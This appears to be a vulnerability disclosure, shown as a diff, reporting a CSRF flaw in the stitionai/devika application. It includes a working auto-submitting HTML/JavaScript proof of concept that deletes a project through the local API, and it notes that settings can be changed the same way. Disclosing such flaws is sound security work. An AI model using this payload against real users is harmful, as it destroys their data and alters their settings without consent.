@@ -1,7 +1,33 @@
 Title: CSRF leads to project deletion and changing settings in stitionai/devika
 
 Proof of Concept: 
+The application does not implement any CSRF protection. Visiting website with content below results in performing successful CSRF attack and deletion of the TEST123 project.
 
+<html>
+  <body>
+    <script>
+      function submitRequest()
+      {
+        var xhr = new XMLHttpRequest();
+        xhr.open("POST", "http:\/\/127.0.0.1:1337\/api\/delete-project", true);
+        xhr.setRequestHeader("Accept", "*\/*");
+        xhr.setRequestHeader("Accept-Language", "en-CA,en-US;q=0.7,en;q=0.3");
+        xhr.setRequestHeader("Content-Type", "application\/json");
+        var body = "{\"project_name\":\"TEST123\"}";
+        var aBody = new Uint8Array(body.length);
+        for (var i = 0; i < aBody.length; i++)
+          aBody[i] = body.charCodeAt(i); 
+        xhr.send(new Blob([aBody]));
+      }
+      submitRequest();
+    </script>
+    <form action="#">
+      <input type="button" value="Submit request" onclick="submitRequest();" />
+    </form>
+  </body>
+</html>
+
+This attack causes disruption to the integrity of the application and data.
 
 Impact: 
 It is possible to perform any action in the application in the context of the victim's browser. For example it is possible to delete any project in the application or change settings of the application.
